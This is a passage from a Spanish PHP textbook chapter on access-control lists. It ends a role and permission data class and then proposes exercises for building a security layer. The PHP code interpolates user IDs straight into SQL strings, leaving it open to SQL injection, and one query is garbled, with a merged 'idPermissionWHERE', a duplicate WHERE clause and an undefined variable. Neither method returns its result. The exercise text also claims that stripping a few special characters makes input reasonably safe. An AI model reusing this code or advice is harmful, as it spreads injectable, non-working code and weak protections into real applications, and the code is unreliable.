            if ($result = $this->db->query("SELECT roles.* FROM roles
                                            INNER JOIN user_roles ON roles.id = user_roles.idRol
                                            WHERE user_roles.idUser = '$idUser'")) {
                if ($result->num_rows > 0) {
                    while ($rol = $result->fetch_object()) {
                        $resultArray[] = $rol;
                    }
                }
                else {
                    return null;
                }
            }
            else {
                return null;
            }

        }

        public function getUserPermissions($idRol) {
            $resultArray = array();
            if ($result = $this->db->query("SELECT permissions.* FROM permissions 
                                            INNER JOIN roles_permissions ON permissions.id = roles_permissions.idPermissionWHERE idUser = '$idUser'
                                            WHERE roles_permissions.idRol = '$idRol'")) {
                if ($result->num_rows > 0) {
                    while ($permission = $result->fetch_object()) {
                        $resultArray[] = $permission;
                    }
                }
                else {
                    return null;
                }
            }
            else {
                return null;
            }

        }
   }
 ?>
```

## 3.6. Ejercicios propuestos

Vamos a terminar este tema con una batería de ejercicios propuestos, que consistirán en una serie de mejoras sobre nuestra implementación de las listas de control de acceso.

Ten en cuenta que lo que hagas aquí se puede reutilizar en posteriores proyectos de aplicaciones web, así que vamos a tomárnoslo en serio, ¿te parece?

#### Ejercicio 1. Crear la capa de seguridad

Si te fijas en el código fuente, hemos accedido en varios puntos al array superglobal *$_SESSION*. Más arriba dijimos que las variables de sesión de PHP no son completamente seguras. Confiar nuestro mecanismo de autenticación a esas variables es como jugar a la ruleta rusa.

¿Y si queremos cambiarlo? Por ejemplo, por *cookies*. Vale, las *cookies* tampoco son muy seguras, pero la pregunta sigue siendo la misma: ¿y si queremos cambiar la forma en la que se almacena el ID del usuario logueado tras la autenticación?

La única manera es *revisar TOOOODO el código fuente* y cambiar las referencias a *$_SESSION* por *$_COOKIE* (o el mecanismo que hayamos elegido para sustituir a las variables de sesión). Y, si pretendemos mejorar la seguridad de la aplicación, no solo sustituirla, lo mismo: ponte a revisar todo tu código una y otra vez.

Por eso suele construirse una **capa de seguridad**. Que es lo que te propongo hacer ahora.

La capa de seguridad no es más que una clase (podemos llamarla *Seguridad* o *Security*) guardada en un archivo aparte que contendrá una colección de métodos para gestionar la seguridad de la aplicación. Así, cada vez que queramos cambiar algo en la forma se protege de los ataques, solo tendremos que acudir a esa clase y tocar aquí o allí, como en una intervención quirúrjica muy localizada.

Así que, en este ejercicio, te pido crear una clase *Seguridad* (o *Security*) que contenga, para empezar, estos métodos:

* **openSession()**: para abrir una sesión de usuario cuando alguien se loguee correctamente. Este método seguirá usando una variable de sesión de PHP (ya lo cambiaremos después). Por ahora, solo queremos centralizar en esta clase el manejo de sesiones y seguridad.
* **getUserId()**: devuelve el ID del usuario logueado (si existe).
* **getUserRoles()**: devuelve un array con los roles del usuario logueado (si existe)
* **getUserPermissions()**: devuelve un array con los permisos del usuario logueado (si existe)

Cuando tengas hecha esa clase, sustituye cualquier referencia a $_SESSION en el código fuente de nuestro caso práctico (ver sección anterior) por llamadas a métodos de esta clase, hasta que el programa funcione exactamente igual que antes, pero con la clase Seguridad integrada en él.

#### Ejercicio 2. Filtrar los datos de entrada

Añade un nuevo método en la clase *Seguridad* que puedes llamar ***filter()***.

Este método recibirá un *string* y lo devolverá filtrado, es decir, limpio de cualquier carácter o palabra sospechosa.

Puedes empezar por eliminar los caracteres especiales como "<", ">", "#" o "$", señal de que alguien puede estar intentando inyectar Javascript, SQL o tratando de atacar mediante CSRF. Con eso ya irás bastante seguro.

Luego busca todos los puntos de la aplicación donde se accede a las variables de la URL sin filtro (es decir, los puntos donde se usa $_REQUEST, $_GET o $_POST) y llama al método *filter()* antes de acceder a esas variables.

Más adelante, puedes mejorar la función de filtrado localizando palabras como "script", "location.href" o similares. Lo bueno de esta solución es que no tendrás que tocar el resto del programa: al tener la función de filtrado encapsulada en la clase *Seguridad*, cualquier mejora posterior afectará a toda la aplicación sin modificar el código externo a esta clase.

#### Ejercicio 3. Cerrar la sesión y destruir las variables

Es algo que no hemos hecho hasta ahora, ¿verdad?

La clase *Seguridad* debe tener un método para destruir las variables de sesión y cerrar la sesión de un usuario autenticado. Lo podemos llamar ***closeSession()***.

Habrá que añadir una opción "Cerrar sesión" en el menú principal de la aplicación que enlace con una entrada del controlador que, a su vez, invoque este método de la clase *Seguridad*.

#### Ejercicio 4. Añadir cookies para controlar la sesión

Hemos dicho a lo largo del texto que manejar las sesiones de usuario solo con las variables de sesión de PHP es arriesgado, puesto que un atacante podría suplantar la sesión con relativa facilidad capturando la *cookie* "phpsessid".

Para proporcionar a este mecanismo un extra de protección, se pueden crear *cookies* adicionales que nos den una pista en caso de que se produzca un ataque. Estas *cookies* se manipulan desde la clase *Seguridad* de forma transparente al resto del programa. Es decir, el resto de clases ni se enteran de que la seguridad de la aplicación se está incrementando. ¡Es la magia de la programación orientada a objetos!

Las *cookies* que vamos a crear en este punto son:

* idUsuario: Guardaremos el id del usuario logueado en una *cookie* además de en una variable de sesión. Cada vez que la clase *Seguridad* vaya a comprobar algo (los permisos del usuario, por ejemplo), se asegurará de que la *cookie* y la variable de sesión contienen exactamente el mismo valor. Cualquier discrepancia provocará un cierre de la sesión inmediato.
* idRol: Haremos lo mismo con el rol del usuario.
* myToken: Será una *cookie* con un valor aleatorio que guardaremos en el cliente, al mismo tiempo que crearemos una variable de sesión donde se guardará el mismo valor. Si un atacante suplanta el id de sesión de PHP, probablemente no suplantará este token. En cada operación de la clase *Seguridad* comprobaremos que los dos tokens coinciden y, si no es así, cerraremos la sesión.

#### Ejercicio 5. Añadir una tabla para controlar la sesión

El mecanismo extra de seguridad que hemos implementado en el apartado anterior no es suficiente. Un atacante avispado se percatará antes o después de que hay por ahí pululando una *cookie* adicional (nuestro token), y terminará suplantándolo.

Para subir un escalón en nuestra protección frente a ataques, necesitamos crear una tabla en la base de datos que tenga más o menos esta estructura:

```sql
 CREATE TABLE IF NOT EXISTS `MySessions` (
    `id` varchar(40) NOT NULL,
    `ipAddress` varchar(45) NOT NULL,
    `idUser` INTEGER NOT NULL,
    `idRol` INTEGER NOT NULL,
    `token` varchar(200) NOT NULL,
    `timestamp` int(10) unsigned DEFAULT 0 NOT NULL,
    PRIMARY KEY (id)
);
```

Cuando un usuario de autentique en la aplicación, crearemos sus variables de sesión y sus *cookies* como hasta ahora y, además, insertaremos un registro en la tabla *MySessions* con toda la información de la sesión, a la que añadiremos:

* La IP desde la que el cliente se ha conectado. Curiosea en internet para averiguar cómo se puede obtener este dato.
* La fecha y hora exacta de esa conexión (a eso se le denomina *timestamp* o marca de tiempo).

En cualquier operación posterior, la clase *Seguridad* realizará todas las comprobaciones que ya realizaba hasta ahora y, además, lanzará una consulta a la base de datos para recuperar, mediante el valor del token, el ID del usuario y su rol. Si el token no existe en la base de datos, mal asunto: cerramos la sesión. Y si hay cualquier discrepancia entre los valores de la base de datos, de las variables de sesión y de las cookies, mal asunto también: cerramos la sesión.

La seguridad puede continuar mejorándose indefinidamente. Por ejemplo: si detectamos un posible ataque procedente de una dirección IP, podemos pasarla a una tabla de "direcciones baneadas" e impedir cualquier intento de conexión en el futuro desde esa dirección.


#### Ejercicio 6. Limitar el acceso al controlador (y completar la aplicación)

Todo esto está muy bien (aunque te hace volverte un poco paranoico, ¿verdad?), pero, por muchas mejoras en la seguridad que estemos introduciendo, cualquier atacante, incluso sin pasar por el login, puede escribir esto en su navegador y meterse hasta la cocina en nuestra aplicación:

```
https://mi-servidor/index.php?action=showMainMenu
```

Sustituye "showMainMenu" por cualquier otra cosa (¿qué tal "deleteUser"?) y tienes un problema de los gordos.

Para programar una aplicación web segura necesitamos **proteger los métodos del controlador**, de manera que solo pueda ejecutarlos un usuario autenticado y con los privilegios adecuados.

Fíjate en que cada usuario tendrá acceso a diferentes métodos del controlador, dependiendo de su rol. Por ejemplo, a un método como *showMainMenu()* podrá acceder cualquier usuario logueado, pero un método como *deleteUser()* debe estar más limitado y solo los administradores deberían poder ejecutarlo.

Así que tienes que añadir una barrera de entrada en cada método del controlador, en forma de un par de líneas de código que comprueben:

a) Que hay un usuario correctamente autenticado.
b) Que ese usuario tiene privilegios suficientes para ejecutar este método.

Las dos comprobaciones se hacen invocando métodos de la clase *Seguridad*. Te dejo a ti pensar cómo se implementa esto exactamente (en realidad, hay varios modos).

Si cualquiera de las dos comprobaciones falla, el usuario verá una pantalla de "Acceso prohibido" o algo por el estilo.

#### Ejercicio 7. Actualizar periódicamente el ID de sesión

Una técnica de defensa frecuente es modificar el ID de sesión periódicamente (cada pocos minutos, o bien cada vez que se recibe una petición del cliente).

Implementa esta opción en tu aplicación. Te advierto que es lo más complicado que has hecho hasta ahora. Puedes considerar que este es un ejercicio de nivel avanzado.

#### Ejercicio 8. Aplicar a un caso realista

Por último, vamos a aplicar todas estas mejoras en la seguridad a una aplicación web más completa.

Para ello, utiliza el código fuente de tu Videoclub (la aplicación que programamos en el tema anterior). Si no dispones de ese código, puedes usar el de la Biblioteca. Lo encontrarás en un capítulo anterior de este mismo texto. No es que sea una aplicación muy completa, pero si te servirá para comprobar que la capa de seguridad es muy eficaz contra los ataques más habituales.

Añade la clase *Seguridad* al código fuente de tu aplicación y sustituye la apertura de la sesión por llamadas a los métodos de la clase *Seguridad*. Por último, protege todos los accesos al controlador para asegurarte de que solo los usuarios con los privilegios adecuados puede ejecutar ese código.

Y una última advertencia: por mucho que protejas una aplicación web, puedes encontrarte con atacantes que burlen tus medidas de seguridad. La única solución para eso es disponer siempre de un *backup* de tu código y tu base de datos para restaurarlo todo en caso de catástrofe, así que no dejes de hacer copias con frecuencia (o contrata un proveedor de *hosting* que las haga por ti).